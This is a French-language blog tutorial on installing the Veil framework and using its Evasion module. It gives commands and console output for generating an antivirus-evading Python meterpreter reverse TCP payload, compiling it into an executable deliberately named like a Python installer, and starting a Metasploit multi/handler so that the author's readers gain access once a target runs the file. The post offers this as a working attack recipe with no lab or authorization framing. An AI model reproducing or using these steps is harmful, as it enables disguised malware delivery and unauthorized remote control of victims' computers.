---
author: Funeoz
permalink: /hacking/veil_evasion_antivirus.html
title: Installation et utilisation de Veil (Evasion d'antivirus)
layout: post
category: hacking
redirect_to:
  - https://thelinuxcamp.github.io/hacking/veil_evasion_antivirus.html
---

![Veil](/techlovers/assets/2018-10-12/image1veil.jpg) 

Veil (et non pas Veil-evasion qui a été discontinué) permet de rendre indétectable à environ 60% du temps un payload qui sera executé sur la cible. Son installation est très simple.

## Installation

Tout d'abord, git clone le repository :

{% highlight bash %}
$ git clone https://github.com/Veil-Framework/Veil.git
#Puis changer de dossier
$ cd Veil 
#Exécuter le script d'installation
$ ./config/setup.sh --force --silent
{% endhighlight %}

Cela va donc installer toutes les dépendances nécessaires. 

Il va vous être demandé aussi de renseigner le chemin pour Metasploit 
(ex:/opt/metasploit-framework)

## Utilisation

Deux modules sont utilisables dans le framework Veil : Evasion et Ordonance.

Evasion permet donc d'éviter la détection des payloads et Ordnance de générer des shellcode rapidement pour les utiliser avec des exploits ou des payloads. Mais cet article ne porte que sur Evasion.

Si on va dans la partie Evasion en tapant <<use 1>> puis <<list>>, on peut voir que ces payloads peuvent être dans différents languages.
Il faut savoir qu'il existe deux "types" de language : 
- les languages à haut niveau
- les languages à bas niveau

Par exemple, le Python est un language à haut niveau. Ce qui veut dire qu'il est proche des languages réels, donc plus simple à écrire. Donc les payloads auront plus de chance à être détectés.

Alors que le go est un language à bas niveau qui se rapproche du language machine.
Donc plus compliqué à être détecté.

On va donc pour l'exemple prendre le payload 28. Pour cela <<use 28>>

On tombe donc sur pleins d'options :

{% highlight bash %}
Veil/Evasion>: use 28
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 Payload Information:

        Name:           Pure Python Reverse TCP Stager
        Language:       python
        Rating:         Excellent
        Description:    pure windows/meterpreter/reverse_tcp stager, no
                        shellcode

Payload: python/meterpreter/rev_tcp selected

 Required Options:

Name                    Value           Description
----                    -----           -----------
CLICKTRACK              X               Optional: Minimum number of clicks to execute payload
COMPILE_TO_EXE          Y               Compile to an executable
CURSORMOVEMENT          FALSE           Check if cursor is in same position after 30 seconds
DETECTDEBUG             FALSE           Check if debugger is present
DOMAIN                  X               Optional: Required internal domain
EXPIRE_PAYLOAD          X               Optional: Payloads expire after "Y" days
HOSTNAME                X               Optional: Required system hostname
INJECT_METHOD           Virtual         Virtual, Void, or Heap
LHOST                                   The listen target address
LPORT                   4444            The listen port
MINRAM                  FALSE           Check for at least 3 gigs of RAM
PROCESSORS              X               Optional: Minimum number of processors
SANDBOXPROCESS          FALSE           Check for common sandbox processes
SLEEP                   X               Optional: Sleep "Y" seconds, check if accelerated
USERNAME                X               Optional: The required user account
USERPROMPT              FALSE           Make user click prompt prior to execution
USE_PYHERION            N               Use the pyherion encrypter
UTCCHECK                FALSE           Optional: Validates system does not use UTC timezone
VIRTUALDLLS             FALSE           Check for dlls loaded in memory
VIRTUALFILES            FALSE           Optional: Check if VM supporting files exist

 Available Commands:

        back            Go back to Veil-Evasion
        exit            Completely exit Veil
        generate        Generate the payload
        options         Show the shellcode's options
        set             Set shellcode option

[python/meterpreter/rev_tcp>>]:
{% endhighlight %}

Ce qui va nous être utilise est de juste renseigner l'adresse de notre ordinateur pour le LHOST grâce à ifconfig, puis génerer le payload : 

{% highlight bash %}
[python/meterpreter/rev_tcp>>]: set LHOST (votreip)
#generation du payload
[python/meterpreter/rev_tcp>>]: generate
{% endhighlight %}

Le module va ensuite demander le nom de fichier que vous voulez donner (ex: python3.7_installer) :

{% highlight bash %}
[>] Please enter the base name for output files (default is payload): python3.7_installer
#Attention:remplacez les espaces par des tirets bas.
{% endhighlight %}

Puis celui-ci va vous demander quel module vous voulez utiliser pour générer l'exécutable (pour moi, ce sera PyInstaller) :

{% highlight bash %}
[?] How would you like to create your payload executable?

     1 - PyInstaller (default)
     2 - Py2Exe

 [>] Please enter the number of your choice: 1
{% endhighlight %}

Le fichier va donc être généré et est disponible à :

{% highlight bash %}
$ cd /var/lib/veil/output/compiled
$ ls
$ python3.7_installer.exe
{% endhighlight %}

Il faudra ensuite lancer msfconsole, sélectionner l'exploit exploit/multi/handler et le payload python/meterpreter/reverse_tcp

{% highlight bash %}
$ msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
payload => python/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST (votreip)
LHOST => (votreip)
msf5 exploit(multi/handler) > run
{% endhighlight %}

La session va donc être lancé puis il faudra que la personne exécute le fichier et voilà, vous aurez accès à votre cible.













